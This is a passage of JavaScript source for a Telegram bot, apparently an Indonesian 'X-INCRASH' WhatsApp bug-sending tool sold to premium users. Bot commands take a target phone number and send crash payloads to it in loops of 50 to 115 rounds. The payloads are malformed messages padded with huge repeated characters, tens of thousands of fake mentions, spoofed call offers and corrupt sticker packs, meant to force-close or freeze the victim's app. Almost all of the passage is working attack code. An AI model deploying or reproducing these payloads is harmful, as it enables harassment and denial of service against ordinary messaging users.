  if (shouldIgnoreMessage(msg)) return;

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!isOwner(userId) && !isAdmin(userId) && !isPremium(userId)) {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /addsender");
    }

    const sentMessage = await bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
<blockquote>「 め 」X-INCRASH \` ATTACK</blockquote>

𖣂. Target ⸸ ${target}
𖣂. Type ⸸ Delay Hard
𖣂. Status ⸸ Process 
𖣂. Date Now ⸸ ${date}

<code>© DanzOfficial ⚚</code>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 100; i++) {
    await JustinMessage(xincrash, target);
    await sleep(1000);
    await delaymention(xincrash, target);
    await sleep(1000);
    await delayhard(target);
    await sleep(1000);
}

    await bot.editMessageCaption(`
<blockquote>「 め 」X-INCRASH \` ATTACK</blockquote>

𖣂. Target ⸸ ${target}
𖣂. Type ⸸ DelayHard
𖣂. Status ⸸ Succes 
𖣂. Date Now ⸸ ${date}

<code>© DanzOfficial ⚚</code>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
// Case Bug 4
bot.onText(/\/Xforclose (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const isTarget = target;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  if (shouldIgnoreMessage(msg)) return;

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!isOwner(userId) && !isAdmin(userId) && !isPremium(userId)) {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /addsender");
    }

    const sentMessage = await bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
<blockquote>「 め 」X-INCRASH \` ATTACK</blockquote>

𖣂. Target ⸸ ${target}
𖣂. Type ⸸ Forclose
𖣂. Status ⸸ Process 
𖣂. Date Now ⸸ ${date}

<code>© DanzOfficial ⚚</code>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 55; i++) {
    await fcinvisotax(target);
    await sleep(1000);
    await fcXinvis(isTarget);
    await sleep(1000);
}

    await bot.editMessageCaption(`
<blockquote>「 め 」X-INCRASH \` ATTACK</blockquote>

𖣂. Target ⸸ ${target}
𖣂. Type ⸸ Forclose
𖣂. Status ⸸ Succes 
𖣂. Date Now ⸸ ${date}

<code>© DanzOfficial ⚚</code>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
// Case Bug 5
bot.onText(/\/Xbulldozer (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  if (shouldIgnoreMessage(msg)) return;

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!isOwner(userId) && !isAdmin(userId) && !isPremium(userId)) {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /addsender");
    }

    const sentMessage = await bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
<blockquote>「 め 」X-INCRASH \` ATTACK</blockquote>

𖣂. Target ⸸ ${target}
𖣂. Type ⸸ Buldozer
𖣂. Status ⸸ Process 
𖣂. Date Now ⸸ ${date}

<code>© DanzOfficial ⚚</code>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 50; i++) {
    await SepongKuota(xincrash, target);
    await sleep(1000);
    await GanyangKuota(target);
    await sleep(1000);
    await delayhard(target);
    await sleep(1000);
}

    await bot.editMessageCaption(`
<blockquote>「 め 」X-INCRASH \` ATTACK</blockquote>

𖣂. Target ⸸ ${target}
𖣂. Type ⸸ Bulldozer
𖣂. Status ⸸ Succes 
𖣂. Date Now ⸸ ${date}

<code>© DanzOfficial ⚚</code>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
// Case Bug 6
bot.onText(/\/FcXDelay (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const isTarget = target;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  if (shouldIgnoreMessage(msg)) return;

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!isOwner(userId) && !isAdmin(userId) && !isPremium(userId)) {
    return bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /addsender");
    }

    const sentMessage = await bot.sendPhoto(chatId, vidthumbnail, {
      caption: `
<blockquote>「 め 」X-INCRASH \` ATTACK</blockquote>

𖣂. Target ⸸ ${target}
𖣂. Type ⸸ FcXDelay
𖣂. Status ⸸ Process 
𖣂. Date Now ⸸ ${date}

<code>© DanzOfficial ⚚</code>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 115; i++) {
    await fcinvisotax(target);
    await sleep(1000);
    await fcXinvis(isTarget);
    await sleep(1000);
    await JustinMessage(xincrash, target);
    await sleep(1000);
    await delaymention(xincrash, target);
    await sleep(1000);
}

    await bot.editMessageCaption(`
<blockquote>「 め 」X-INCRASH \` ATTACK</blockquote>

𖣂. Target ⸸ ${target}
𖣂. Type ⸸ FcXDelay
𖣂. Status ⸸ Succes 
𖣂. Date Now ⸸ ${date}

<code>© DanzOfficial ⚚</code>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
//--------------------{ Function Bugs }--------------------//
async function fcinvisotax(target) {
const sender = [...sessions.keys()][0];
  if (!sender || !sessions.has(sender)) return { success: false, error: "no-sender" };
  const xincrash = sessions.get(sender);
  if (!xincrash) return { success: false, error: "invalid-sessions" };
  let baileysLib = null;
  try { baileysLib = require('@otaxayun/baileys'); } catch (e1) { try { baileysLib = require('@otaxayun/baileys'); } catch (e2) { baileysLib = null; } }

  const encodeWAMessageFn = baileysLib?.encodeWAMessage ?? xincrash.encodeWAMessage?.bind(xincrash) ?? ((msg) => {
    try { return Buffer.from(JSON.stringify(msg)); } catch (e) { return Buffer.from([]); }
  });

  const encodeSignedDeviceIdentityFn = baileysLib?.encodeSignedDeviceIdentity ?? xincrash.encodeSignedDeviceIdentity?.bind(xincrash) ?? null;

  try {
    const jid = String(target).includes("@s.whatsapp.net")
      ? String(target)
      : `${String(target).replace(/\D/g, "")}@s.whatsapp.net`;

    const janda = () => {
      let map = {};
      return {
        mutex(key, fn) {
          map[key] ??= { task: Promise.resolve() };
          map[key].task = (async prev => {
            try { await prev; } catch {}
            return fn();
          })(map[key].task);
          return map[key].task;
        }
      };
    };

    const javhd = janda();
    const jepang = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    const yntkts = encodeWAMessageFn;

    xincrash.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

      const patched = await (xincrash.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      const ywdh = Array.isArray(patched) ? patched : recipientJids.map(j => ({ recipientJid: j, message: patched }));

      const { id: meId, lid: meLid } = xincrash.authState.creds.me;
      const omak = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;

      const nodes = await Promise.all(ywdh.map(async ({ recipientJid: j, message: msg }) => {
        const { user: targetUser } = jidDecode(j);
        const { user: ownUser } = jidDecode(meId);
        const isOwn = targetUser === ownUser || targetUser === omak;
        const y = j === meId || j === meLid;
        if (dsmMessage && isOwn && !y) msg = dsmMessage;

        const bytes = jepang(yntkts ? yntkts(msg) : Buffer.from([]));
        return javhd.mutex(j, async () => {
          const { type, ciphertext } = await xincrash.signalRepository.encryptMessage({ jid: j, data: bytes });
          if (type === "pkmsg") shouldIncludeDeviceIdentity = true;
          return {
            tag: "to",
            attrs: { jid: j },
            content: [{ tag: "enc", attrs: { v: "2", type, ...extraAttrs }, content: ciphertext }]
          };
        });
      }));

      return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
    };

    let devices = [];
    try {
      devices = (await xincrash.getUSyncDevices([jid], false, false))
        .map(({ user, device }) => `${user}${device ? ":" + device : ""}@s.whatsapp.net`);
    } catch {
      devices = [jid];
    }

    try { await xincrash.assertSessions(devices); } catch {}

    let { nodes: destinations, shouldIncludeDeviceIdentity } = { nodes: [], shouldIncludeDeviceIdentity: false };
    try {
      const created = await xincrash.createParticipantNodes(devices, { conversation: "y" }, { count: "0" });
      destinations = created?.nodes ?? [];
      shouldIncludeDeviceIdentity = !!created?.shouldIncludeDeviceIdentity;
    } catch { destinations = []; shouldIncludeDeviceIdentity = false; }

    const otaxkiw = {
      tag: "call",
      attrs: { to: jid, id: xincrash.generateMessageTag ? xincrash.generateMessageTag() : crypto.randomBytes(8).toString("hex"), from: xincrash.user?.id || xincrash.authState?.creds?.me?.id },
      content: [{
        tag: "offer",
        attrs: {
          "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
          "call-creator": xincrash.user?.id || xincrash.authState?.creds?.me?.id
        },
        content: [
          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
          { tag: "video", attrs: { orientation: "0", screen_width: "1920", screen_height: "1080", device_orientation: "0", enc: "vp8", dec: "vp8" } },
          { tag: "net", attrs: { medium: "3" } },
          { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
          { tag: "encopt", attrs: { keygen: "2" } },
          { tag: "destination", attrs: {}, content: destinations }
        ]
      }]
    };

    if (shouldIncludeDeviceIdentity && encodeSignedDeviceIdentityFn) {
      try {
        const deviceIdentity = encodeSignedDeviceIdentityFn(xincrash.authState.creds.account, true);
        otaxkiw.content[0].content.push({ tag: "device-identity", attrs: {}, content: deviceIdentity });
      } catch (e) {}
    }

    await xincrash.sendNode(otaxkiw);

    return { success: true, target: jid, method: "sendNode" };
  } catch (err) {
    return { success: false, error: err?.message ?? String(err) };
  }
}

async function SepongKuota(xincrash, target) {
try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "YT DanzOfficial-ID",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude:  -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "YT DanzOfficial-ID",
                address: "꧀꧀꧀꧀꧀꧀꧀꧀꧀꧀",
              },
            },
            body: {
              text: "YT DanzOfficial-ID",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await xincrash.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}

async function fcXinvis(isTarget) {
const { encodeSignedDeviceIdentity, jidEncode, jidDecode, encodeWAMessage, patchMessageBeforeSending, encodeNewsletterMessage } = require("@otaxayun/baileys");
let devices = (
await xincrash.getUSyncDevices([isTarget], false, false)
).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

await xincrash.assertSessions(devices)

let xnxx = () => {
let map = {};
return {
mutex(key, fn) {
map[key] ??= { task: Promise.resolve() };
map[key].task = (async prev => {
try { await prev; } catch {}
return fn();
})(map[key].task);
return map[key].task;
}
};
};

let justin = xnxx();
let Official = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
let XMods = xincrash.createParticipantNodes.bind(xincrash);
let Cyber = xincrash.encodeWAMessage?.bind(xincrash);

xincrash.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

let patched = await (xincrash.patchMessageBeforeSending?.(message, recipientJids) ?? message);
let memeg = Array.isArray(patched)
? patched
: recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

let { id: meId, lid: meLid } = xincrash.authState.creds.me;
let omak = meLid ? jidDecode(meLid)?.user : null;
let shouldIncludeDeviceIdentity = false;

let nodes = await Promise.all(memeg.map(async ({ recipientJid: jid, message: msg }) => {
let { user: targetUser } = jidDecode(jid);
let { user: ownPnUser } = jidDecode(meId);
let isOwnUser = targetUser === ownPnUser || targetUser === omak;
let y = jid === meId || jid === meLid;
if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

let bytes = Official(Cyber ? Cyber(msg) : encodeWAMessage(msg));

return justin.mutex(jid, async () => {
let { type, ciphertext } = await xincrash.signalRepository.encryptMessage({ jid, data: bytes });
if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
return {
tag: 'to',
attrs: { jid },
content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
};
});
}));

return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
};

let Exo = crypto.randomBytes(32);
let Floods = Buffer.concat([Exo, Buffer.alloc(8, 0x01)]);
let { nodes: destinations, shouldIncludeDeviceIdentity } = await xincrash.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

let lemiting = {
tag: "call",
attrs: { to: isTarget, id: xincrash.generateMessageTag(), from: xincrash.user.id },
content: [{
tag: "offer",
attrs: {
"call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
"call-creator": xincrash.user.id
},
content: [
{ tag: "audio", attrs: { enc: "opus", rate: "16000" } },
{ tag: "audio", attrs: { enc: "opus", rate: "8000" } },
{
tag: "video",
attrs: {
orientation: "0",
screen_width: "1920",
screen_height: "1080",
device_orientation: "0",
enc: "vp8",
dec: "vp8"
}
},
{ tag: "net", attrs: { medium: "3" } },
{ tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
{ tag: "encopt", attrs: { keygen: "2" } },
{ tag: "destination", attrs: {}, content: destinations },
...(shouldIncludeDeviceIdentity ? [{
tag: "device-identity",
attrs: {},
content: encodeSignedDeviceIdentity(xincrash.authState.creds.account, true)
}] : [])
]
}]
};
await xincrash.sendNode(lemiting);
}

async function JustinMessage(xincrash, target) {
  try {
    const msgContent = proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          lottieStickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0&mms3=true",
            fileSha256: Buffer.from("ljadeB9XVTFmWGheixLZRJ8Fo9kZwuvHpQKfwJs1ZNk=", "base64"),
            fileEncSha256: Buffer.from("D0X1KwP6KXBKbnWvBGiOwckiYGOPMrBweC+e2Txixsg=", "base64"),
            mediaKey: Buffer.from("yRF/GibTPDce2s170aPr+Erkyj2PpDpF2EhVMFiDpdU=", "base64"),
            mimetype: "application/was",
            height: 512,
            width: 512,
            directPath: "/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0",
            fileLength: "14390",
            mediaKeyTimestamp: "1760786856",
            isAnimated: true,
            stickerSentTs: "1760786855983",
            isAvatar: false,
            isAiSticker: false,
            isLottie: true,
            stickerType: 2, 
            contextInfo: {
              isForwarded: false,
              mentionedJid: []
            }
          }
        }
      }
    });

    const msg = generateWAMessageFromContent(target, msgContent, {});
    await xincrash.relayMessage(target, msg.message, { messageId: msg.key.id });

    console.log("JUSTIN SENDING BUG");
  } catch (e) {
    console.error("❌ Function Eror:", e);
  }
}

async function packBlankNew(xincrash, target) {
  await xincrash.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "X",
        name: "./justin" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        publisher: "./justin" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        stickers: [
          {
            fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "justinoffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "justinoffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "justinoffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "justinoffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "justinoffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "justinoffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "justinoffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "justinoffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "justinoffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "justinoffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
        ],
        fileLength: "999999",
        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
        directPath:
          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
        contextInfo: {
          quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot"
                }
            }
        },
        packDescription: "./justin" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        mediaKeyTimestamp: "1741150286",
        trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
        thumbnailDirectPath:
          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
        thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
        thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash:
          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
        stickerPackSize: "999999999",
        stickerPackOrigin: "1",
      },
    }, { participant: { jid: target } });
}

async function GanyangKuota(target) {
try {
const justininvis = "\u2063".repeat(4000);
const justin = "\u300B".repeat(3000);

const msg1 = {  
  viewOnceMessage: {  
    message: {  
      interactiveResponseMessage: {  
        body: {  
          text: "justin offc",  
          format: "DEFAULT"  
        },  
        nativeFlowResponseMessage: {  
          name: "call_permission_request",  
          paramsJson: "\u0000".repeat(9000),  
          actions: [  
            { name: "galaxy_message", buttonParamsJson: "\u0005".repeat(6000) + justininvis }  
          ],  
          version: 3  
        }  
      }  
    }  
  }  
};  

const msg2 = {  
  stickerMessage: {  
    url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",  
    fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",  
    fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",  
    mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",  
    mimetype: "image/webp",  
    height: 9999,  
    width: 9999,  
    directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",  
    fileLength: 12260,  
    mediaKeyTimestamp: "1743832131",  
    isAnimated: false,  
    stickerSentTs: "X",  
    isAvatar: false,  
    isAiSticker: false,  
    isLottie: false,  
    contextInfo: {  
      mentionedJid: [  
        "0@s.whatsapp.net",  
        ...Array.from({ length: 1900 }, () =>  
          `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`  
        )  
      ],  
      stanzaId: "1234567890ABCDEF",  
      quotedMessage: {  
        paymentInviteMessage: {  
          serviceType: 3,  
          expiryTimestamp: Date.now() + 1814400000  
        }  
      }  
    }  
  }  
};  

const msg3 = {  
  viewOnceMessage: {  
    message: {  
      interactiveMessage: {  
        body: {  
          xternalAdReply: {  
            title: "justin",  
            text: justin  
          }  
        },  
        extendedTextMessage: {  
          text: "{".repeat(9000),  
          contextInfo: {  
            mentionedJid: Array.from(  
              { length: 2000 },  
              (_, i) => `1${i}@s.whatsapp.net`  
            )  
          }  
        },  
        businessMessageForwardInfo: {  
          businessOwnerJid: "13135550002@s.whatsapp.net"  
        },  
        nativeFlowMessage: {  
          buttons: [  
            { name: "cta_url", buttonParamsJson: "\u0005".repeat(1000) + salsa },  
            { name: "call_permission_request", buttonParamsJson: "\u0005".repeat(7000) + salsa }  
          ],  
          nativeFlowResponseMessage: {  
            name: "galaxy_message",  
            paramsJson: "\u0000".repeat(7000),  
            version: 3  
          },  
          contextInfo: {  
            mentionedJid: [  
              "0@s.whatsapp.net",  
              ...Array.from(  
                { length: 1900 },  
                () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`  
              )  
            ]  
          }  
        }  
      }  
    }  
  }  
};  

const msg4 = {  
  viewOnceMessage: {  
    message: {  
      interactiveResponseMessage: {  
        body: {  
          text: "justinoffc",  
          format: "DEFAULT"  
        },  
        nativeFlowResponseMessage: {  
          name: "call_permission_request",  
          paramsJson: "\u0000".repeat(6000),  
          version: 3  
        },  
        contextInfo: {  
          participant: "0@s.whatsapp.net",  
          remoteJid: "status@broadcast",  
          mentionedJid: [  
            "0@s.whatsapp.net",  
            ...Array.from({ length: 1900 }, () =>  
              "1" + Math.floor(Math.random() * 500000).toString(16).padStart(6, "0")  
            )  
          ],  
          quotedMessage: {  
            paymentInviteMessage: {  
              serviceType: 3,  
              expiryTimeStamp: Date.now() + 1690500  
            }  
          }  
        }  
      }  
    }  
  }  
};  

const msg5 = {  
  requestPhoneNumberMessage: {  
    contextInfo: {  
      businessMessageForwardInfo: {  
        businessOwnerJid: "13135550002@s.whatsapp.net"  
      },  
      bimid: "apa an bego" + "p" + Math.floor(Math.random() * 99999),  
      forwardingScore: 100,  
      isForwarded: true,  
      forwardedNewsletterMessageInfo: {  
        newsletterJid: "120363321780349272@newsletter",  
        serverMessageId: 1,  
        newsletterName: "information justin".repeat(1)  
      }  
    }  
  }  
};  

const msg6 = {  
  videoMessage: {  
    url: "https://example.com/video.mp4",  
    mimetype: "video/mp4",  
    fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",  
    fileLength: "1515940",  
    seconds: 14,  
    mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",  
    height: 1280,  
    width: 720,  
    fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",  
    directPath: "/example",  
    mediaKeyTimestamp: "1748276788",  
    contextInfo: {  
      isSampled: true,  
      mentionedJid: typeof mentionedList !== "undefined" ? mentionedList : []  
    }  
  }  
};  

const msg7 = [  
  {  
    ID: "68917910",  
    uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",  
    buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",  
    sid: "5e03e0",  
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",  
    ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",  
